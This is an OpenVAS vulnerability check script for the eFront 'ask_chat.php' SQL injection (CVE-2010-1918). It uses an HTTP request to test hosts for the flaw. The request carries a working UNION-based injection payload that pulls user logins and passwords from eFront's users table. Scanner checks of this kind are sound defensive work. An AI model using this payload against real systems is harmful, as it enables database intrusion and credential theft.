##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_efront_sql_inj_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# eFront 'ask_chat.php' SQL Injection Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to to view, add, modify or
  delete information in the back-end database.
  Impact Level: Application.";
tag_affected = "eFront version 3.6.2 and prior.";

tag_insight = "The flaw exists due to an error in 'ask_chat.php', which fails to properly
  sanitise input data passed via the 'chatrooms_ID' parameter.";
tag_solution = "No solution or patch is available as of 18th May, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.efrontlearning.net/";
tag_summary = "This host is running eFront and is prone to SQL injection
  vulnerability.";

if(description)
{
  script_id(800778);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-05-19 14:50:39 +0200 (Wed, 19 May 2010)");
  script_cve_id("CVE-2010-1918");
  script_bugtraq_id(40032);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("eFront 'ask_chat.php' SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/39728");
  script_xref(name : "URL" , value : "http://www.vupen.com/english/advisories/2010/1101");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/1005-exploits/MOPS-2010-018.pdf");

  script_description(desc);
  script_summary("Check through the exploit string on eFront");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_efront_detect.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

efPort = get_http_port(default:80);
if(!get_port_state(efPort)){
  exit(0);
}

## Get eFront version from KB
efVer = get_kb_item("www/"+ efPort + "/eFront");

if(!efVer){
  exit(0);
}

efVer = eregmatch(pattern:"^(.+) under (/.*)$", string:efVer);
if(efVer[2] != NULL)
{
  ## Try the exploit
  sndReq = http_get(item:string(efVer[2], "/www/ask_chat.php?chatrooms_ID=0%20" +
                   "UNION%20select%20concat%28login,0x2e,password%29,1,1,1,1%2" +
                   "0from%20users%20--%20x"), port:efPort);
  rcvRes = http_send_recv(port:efPort, data:sndReq);

  ## Check for the substring in the Response
  if("0 UNION select concat(login,0x2e,password)" >< rcvRes && "admin" >< rcvRes){
    security_hole(efPort);
  }
}
